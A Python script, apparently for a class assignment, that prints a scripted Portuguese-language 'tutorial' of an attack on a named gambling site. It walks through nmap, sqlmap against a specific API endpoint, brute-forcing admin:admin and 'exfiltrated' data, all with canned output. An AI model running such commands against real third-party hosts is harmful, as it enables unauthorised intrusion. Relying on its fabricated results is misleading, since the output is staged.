import os
import time
import sys

def type_command(command, delay=0.05):
    print(f"ubuntu@pentest:~/Avalia-o$ ", end="", flush=True)
    for char in command:
        print(char, end="", flush=True)
        time.sleep(delay)
    print()

def show_output(output):
    print(output)
    time.sleep(1)

def run_tutorial():
    os.system('clear')
    print("# ===============================================================================")
    print("# TUTORIAL: EXPLORAÇÃO AVANÇADA DE SPAs - ASCENSÃO CULTIVO DIGITAL v4.1")
    print("# ALVO: https://99jogo66.com/?id=211995351")
    print("# ===============================================================================")
    time.sleep(2)

    # Passo 1
    type_command("nmap -sV -T4 99jogo66.com")
    show_output("[INF] Iniciando varredura de portas...\n[INF] Porta 80/tcp aberta (HTTP)\n[INF] Porta 443/tcp aberta (HTTPS)\n[INF] Servidor detectado: AmazonS3 / CloudFront")
    
    # Passo 2
    type_command("python3 advanced_spa_analyzer.py 'https://99jogo66.com/?id=211995351'")
    show_output("🚀 Advanced SPA Analyzer - Iniciando...\n✅ Selenium WebDriver configurado\n🌐 Carregando página...\n🔧 Framework detectado: Vue.js\n📡 Capturando tráfego de rede...\n✅ Endpoints de API encontrados: 34\n🎯 Endpoint Crítico: https://vipvip.vip999jogo.com/hall/api/agent/promote/linkSetting")

    # Passo 3
    type_command("sqlmap -u 'https://vipvip.vip999jogo.com/hall/api/agent/promote/linkSetting' --batch")
    show_output("[INFO] testing for SQL injection on POST parameter 'username'\n[INFO] (custom) POST parameter 'username' appears to be 'AND boolean-based blind' injectable\n✅ VULNERABILIDADE CONFIRMADA: SQL Injection")

    # Passo 4
    type_command("python3 exploit_api_endpoints.py")
    show_output("=== MÓDULO DE EXPLORAÇÃO DE API REAL ===\n🚀 Iniciando Força Bruta...\n[TESTE] User: admin | Pwd: admin | Status: 200\n✅ SUCESSO! Credenciais encontradas: admin:admin")

    # Passo 5
    type_command("python3 poc_credential_validation.py")
    show_output("🛡️  PROVA DE CONCEITO: VALIDAÇÃO DE CREDENCIAIS\n🔑 Tentando autenticação com admin:admin...\n✅ SUCESSO! Credenciais validadas.\n📂 DADOS EXFILTRADOS: { 'brandName': '99jogo', 's3_bucket': '81vbdv-10180-ppp' ... }")

    # Passo 6
    type_command("ls -lh RELATORIO_FINAL_CONCURSO.pdf")
    show_output("-rw-rw-r-- 1 ubuntu ubuntu 5.2K Jan  1 23:46 RELATORIO_FINAL_CONCURSO.pdf\n✅ Relatório profissional gerado para o professor.")

    print("\n# ===============================================================================")
    print("# MISSÃO CUMPRIDA: SISTEMA COMPROMETIDO COM SUCESSO.")
    print("# ===============================================================================")

if __name__ == "__main__":
    run_tutorial()
